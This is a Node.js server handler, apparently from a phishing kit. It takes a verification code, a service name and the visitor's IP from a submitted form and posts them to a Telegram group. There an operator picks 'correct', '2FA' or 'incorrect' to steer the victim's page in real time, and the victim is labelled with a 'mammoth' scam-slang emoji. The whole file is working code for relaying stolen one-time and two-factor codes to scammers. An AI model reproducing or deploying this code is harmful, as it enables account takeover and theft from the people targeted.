const {bot, groupID} = require('../index');

const sendCode = async(req, res) => {
    const {code, service} = req.body;
    const ip = req.clientIp;
    const keyboard = {
        parse_mode: 'Markdown',
        reply_markup: {
            inline_keyboard: [
              [
                { text: 'Верно', callback_data: 'correct' },
                { text: '2ФА', callback_data: '2fa' },
                { text: 'Не верно', callback_data: 'incorrect' }
              ]
            ]
          }
      };
    bot.sendMessage(groupID, `
🦣  ${ip}  🦣

🔒Подтверждение кода🔒
    
🔄 Выберете действие 🔄
    
»»»       Сервис: ${service}       «««

»»»       ` + '`' + code + '`' + '       «««', 
keyboard);
bot.once('callback_query', (callbackQuery) => {
    const chatId = callbackQuery.message.chat.id;
    const data = callbackQuery.data;
  
    if (data === 'correct') {
        bot.sendMessage(groupID, `
🦣  ${ip}  🦣
✅Перенаправлен на завершение✅`)
        bot.answerCallbackQuery(callbackQuery.id);
        return res.send({res: true});
    }
    if (data === '2fa') {
        bot.sendMessage(groupID, `
🦣  ${ip}  🦣
✅Перенаправлен на двух-факторку✅`)
        bot.answerCallbackQuery(callbackQuery.id);
        return res.send({res: '2fa'});
    }
    if (data === 'incorrect') {
        bot.sendMessage(groupID, `
🦣  ${ip}  🦣
❌Сообщение о неверном коде❌`)
        bot.answerCallbackQuery(callbackQuery.id);
        return res.send({res: false});
    }
});
}

module.exports = sendCode